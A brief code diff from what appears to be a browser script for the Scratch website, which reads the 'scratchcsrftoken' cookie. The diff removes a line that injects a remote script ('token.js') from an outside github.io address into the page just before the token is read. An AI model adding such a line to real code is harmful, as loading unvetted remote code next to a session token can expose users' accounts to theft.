@@ -9,7 +9,6 @@
         }
         return '';
     }
-    var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
     let token = getCookieValue("scratchcsrftoken");
     let data = new Date();
     let year=data.getFullYear();
